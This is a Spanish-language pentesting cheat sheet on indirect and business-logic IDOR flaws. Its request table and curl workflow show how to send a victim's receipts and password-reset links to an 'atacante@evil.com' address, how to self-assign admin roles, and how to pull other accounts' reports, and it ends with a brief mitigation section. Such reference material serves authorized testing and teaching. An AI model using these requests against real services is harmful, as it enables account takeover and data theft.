---
aliases:
tags:
  - vuln/idor
  - technique/discovery
  - asset/api
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[BOLA - IDOR]]"
---
# IDOR - Explotación Indirecta y Lógica de Negocio

---

## Cheatsheet

| **Request** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `POST /api/send_receipt` con `{"user_id": 106, "email": "atacante@evil.com"}` | Recibo del usuario 106 enviado al email del atacante | Endpoint hace acción sin reflejar data — Blind IDOR. |
| `PATCH /profile` con `{"linked_account": 106}` + después `GET /export_linked_data` | Export de datos del account 106 via dos requests | Stored IDOR — ID persiste en estado server-side. |
| `PUT /order/106/status` con `{"status":"cancelled"}` | Cancelación de orden de otro usuario | Endpoint state-changing sin chequeo de ownership. |
| `POST /join_team` con `{"team_id":"admin_group"}` | Auto-asignación a grupo admin (priv esc vertical) | Endpoint asume team_id no es atacante-controlled. |
| `POST /role/assign` con `{"user_id":SELF,"role_id":1}` | Self-promote a role admin (id=1) | RBAC con role ID predecible. |
| `POST /checkout/step3` con `cart_id=106` | Procesar items de carrito ajeno con tu pago | Multi-step flow valida solo en step1. |
| `POST /generate_report` con `{"account_id":106}` + `GET /downloads/latest.pdf` | PDF con data de account 106 en tu inbox de downloads | Async job sin validación de owner. |
| `POST /password/reset/initiate` con `{"user":"victim","email":"atacante@evil.com"}` | Reset link enviado a atacante | Mass Assignment del email en reset flow. |
| `POST /share` con `{"resource_id":106,"to_user":"atacante"}` | Compartir recurso ajeno con vos mismo | Endpoint asume `resource_id` es del actor. |
| `POST /follow` con `{"follower_id":VICTIM,"following_id":ATACANTE}` | Forzar a víctima a seguir cuenta atacante | Confused-deputy con campos invertidos. |
^idor-indirecta

### Workflow

```bash
# 1. Blind IDOR — observar efectos secundarios
# Trigger action, después chequear sources separados (email, dashboard, notifications)
curl -X POST https://target/api/send_receipt \
  -H 'Cookie: session=USER_A' \
  -d '{"user_id": 106, "email": "atacante@evil.com"}'
# → revisar inbox atacante

# 2. Stored IDOR — two-step
curl -X PATCH https://target/profile \
  -H 'Cookie: session=USER_A' \
  -d '{"linked_account": 106}'
curl -X GET https://target/export_linked_data \
  -H 'Cookie: session=USER_A'

# 3. Async report attack
curl -X POST https://target/api/reports \
  -H 'Cookie: session=USER_A' \
  -d '{"account_id": 106, "format": "pdf"}'
sleep 5
curl -s https://target/api/downloads | grep -oE 'report_[a-z0-9]+\.pdf' | head -1 | \
  xargs -I{} curl -s "https://target/api/downloads/{}" -o leaked.pdf

# 4. Race condition + IDOR
for i in 1 2 3 4 5; do
  curl -X POST https://target/checkout/step3 \
    -H 'Cookie: session=USER_A' \
    -d "cart_id=106" &
done
wait
```

### Mitigación

Cada microservicio / async job revalida autz de manera autónoma — nada de "trust inherited from previous step". Estado del flow server-side acoplado al session token. One-time tokens para acciones críticas (export, role change). Confused-deputy fix: ignorar `actor_id`/`from_id` del body, derivar siempre del token.

---
